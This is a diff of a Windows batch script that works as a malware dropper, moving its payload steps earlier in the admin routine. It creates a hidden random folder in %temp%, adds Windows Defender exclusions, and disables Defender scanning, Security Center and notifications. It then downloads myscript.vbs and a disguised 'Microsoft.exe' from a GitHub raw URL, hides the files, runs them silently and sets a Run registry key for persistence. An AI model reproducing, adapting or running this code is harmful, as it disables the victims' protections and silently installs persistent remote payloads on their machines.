@@ -21,6 +21,24 @@ goto :eof
 
 :admin
 
+REM Create hidden and random folder
+set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
+mkdir "%hiddenFolder2%"
+
+REM Set hidden attribute for folder
+attrib +h "%hiddenFolder2%"
+
+REM Exclude hidden folder from Windows Defender
+powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\myscript.vbs'"
+
+:: myscript
+curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder2%\myscript.vbs"
+
+attrib +h +s "%hiddenFolder2%\myscript.vbs"
+
+REM Run payload silently and pass %hiddenFolder% variable
+start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" %hiddenFolder1%
+
 ::external
 taskkill /f /im SecHealthUI.exe >nul 2>&1
 reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul
@@ -106,26 +124,18 @@ powershell Set-MpPreference -QuickScanEnabled 0
 powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
 powershell Set-MpPreference -ControlledFolderAccess Disabled
 
-REM Create hidden and random folder
-set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
-mkdir "%hiddenFolder2%"
-
 REM Exclude hidden folder from Windows Defender
 powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
-powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\myscript.vbs'"
 
 REM Download payload files to hidden folder using curl
-curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder2%\myscript.vbs"
 curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
 
 REM Set hidden attribute for files
-attrib +h +s "%hiddenFolder2%\myscript.vbs"
 attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 
 REM Add registry key to start Microsoft.exe on boot
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
 
-REM Run payload silently and pass %hiddenFolder% variable
-start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"
+start /B "%hiddenFolder2%\Microsoft.exe"
 
 goto :eof
